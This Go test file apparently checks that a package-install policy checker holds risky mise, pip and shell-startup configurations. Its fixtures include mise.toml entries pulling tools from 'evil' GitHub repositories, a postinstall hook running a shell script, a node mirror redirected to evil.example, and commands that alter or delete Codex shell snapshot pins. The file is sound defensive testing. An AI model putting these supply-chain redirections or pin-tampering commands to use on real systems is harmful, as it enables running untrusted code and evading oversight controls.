//go:build unix

package main

// Independent re-review of 0be24f0 (REPO-POL-NPMRC round 10, ADR-0174 round 15), 2026-11-15: proof tests. A failing
// case is a finding.

import (
	"bytes"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// R10-1: mise [tools] that put another program first or run code when mise installs the tool (mise installs a missing
// tool when its shim runs, not_found_auto_install): a backend from any GitHub repository (github:, ubi:, aqua:), a
// tool's postinstall command, and [settings] that move where node is downloaded from.
func TestR10ReviewMiseTools(t *testing.T) {
	for _, body := range []string{
		"[tools]\n\"github:evil/npm\" = \"latest\"\n",
		"[tools]\n\"ubi:evil/npm\" = \"latest\"\n",
		"[tools]\n\"aqua:evil/npm\" = \"latest\"\n",
		"[tools]\nnode = { version = \"22\", postinstall = \"sh /srv/evil/x.sh\" }\n",
		"[settings]\nnode.mirror_url = \"https://evil.example/node/\"\n",
	} {
		_, _, cwd := npmWorkspace(t)
		write(t, filepath.Join(cwd, "mise.toml"), body)
		if form, stderr := round7(t, cwd, "npm i @acme/cli", nil); form == "silent" {
			t.Errorf("mise.toml %q: an exception covers it (stderr %q)", strings.TrimSpace(body), stderr)
		}
	}
}

// R10-2 (false hold that approve cannot clear): a startup file that sources /dev/stdin (source /dev/stdin <<<"$(…)")
// names a file the reader cannot read as a regular file, so every check is moved and policy-approve cannot pin it.
func TestR10ReviewSourceDevStdin(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	home := t.TempDir()
	write(t, filepath.Join(home, ".zshrc"), "source /dev/stdin <<<\"$(/opt/homebrew/bin/brew shellenv)\"\n")
	dir := filepath.Join(t.TempDir(), "pin")
	if why := why13(t, cwd, home, dir); why != "" {
		t.Logf("first use holds: %s", why)
		var out bytes.Buffer
		if err := policyApprove(&out, pinned(t, home, dir), (&codeTTY{}).open); err != nil {
			t.Errorf("and policy-approve cannot clear it: %v", err)
		}
	}
}

// R10-3 (false hold, the second layer): the user's own UV_PYTHON naming an interpreter by path, in a startup file or
// the runtime's environment, holds every PyPI exception; policy-approve does not clear a judged value.
func TestR10ReviewOwnUvPython(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	home := t.TempDir()
	if form, stderr := round7(t, cwd, "pip install acme-tools==2.0.1", npmrcFiles(t, "", home, []string{"UV_PYTHON=/opt/homebrew/bin/python3.13"}, nil)); form != "silent" {
		t.Logf("UV_PYTHON in the runtime's environment, pip install: %s (stderr %q)", form, stderr)
		t.Errorf("the user's own UV_PYTHON path holds a pip exception")
	}
}

// Controls: the snapshot window as now stated, and a fresh snapshot pinned on first sight.
func TestR10ReviewSnapshotControls(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	home := t.TempDir()
	snaps := filepath.Join(home, ".codex", "shell_snapshots")
	mkdir(t, snaps)
	dir := filepath.Join(t.TempDir(), "pin")
	if why := why13(t, cwd, home, dir); why != "" {
		t.Fatalf("first use: %s", why)
	}
	now := time.Now().UnixNano()
	fresh := filepath.Join(snaps, "019a0000-0000-7000-8000-000000000001."+itoa(now)+".sh")
	write(t, fresh, "# Snapshot file\n")
	if why := why13(t, cwd, home, dir); why != "" {
		t.Errorf("a fresh snapshot: %s", why)
	}
	old := filepath.Join(snaps, "019a0000-0000-7000-8000-000000000002."+itoa(now-int64(5*24*time.Hour))+".sh")
	write(t, old, "# Snapshot file\n")
	if why := why13(t, cwd, home, dir); why == "" {
		t.Errorf("a snapshot with a name older than the horizon, new to the pin: nothing moved")
	}
	for _, line := range []string{"echo x >> ~/.codex/shell_snapshots/a.sh", "rm $CODEX_HOME/x"} {
		if !touchesPin(line) {
			t.Errorf("%q not held", line)
		}
	}
}

func itoa(n int64) string { return fmtInt(n) }

func fmtInt(n int64) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}
